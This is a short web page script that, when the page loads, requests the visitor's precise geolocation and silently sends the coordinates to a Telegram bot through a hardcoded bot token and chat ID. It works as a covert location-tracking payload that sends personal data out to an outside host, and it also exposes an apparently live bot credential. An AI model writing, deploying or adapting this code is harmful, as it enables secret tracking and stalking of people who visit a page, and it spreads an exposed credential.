<script>
    const BOT_TOKEN = "8689283758:AAGAoRKk6uoS1NrC828IWkpizNYM__9K7Qg"; // REPLACE THIS!
    const CHAT_ID = "1755569255"; // Verify this ID is correct
    
    async function sendLocation(lat, lng) {
        const message = `📍 Location Shared!\n\nLat: ${lat}\nLng: ${lng}\n\nMap: https://maps.google.com/?q=${lat},${lng}`;
        
        // Use your own proxy or Telegram's sendLocation method
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    latitude: lat, 
                    longitude: lng 
                })
            });
            
            const data = await response.json();
            console.log('Response:', data);
            
            if (!data.ok) {
                console.error('Telegram API error:', data.description);
            }
        } catch(error) {
            console.log('Fetch error:', error);
        }
    }
    
    // Request permission and send location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                console.log('Got location, sending...');
                sendLocation(position.coords.latitude, position.coords.longitude);
            },
            (error) => {
                console.log('Location error:', error.code, error.message);
                // Permission denied is error.code = 1
            },
            { timeout: 10000, enableHighAccuracy: true }
        );
    } else {
        console.log('Geolocation not supported');
    }
</script>
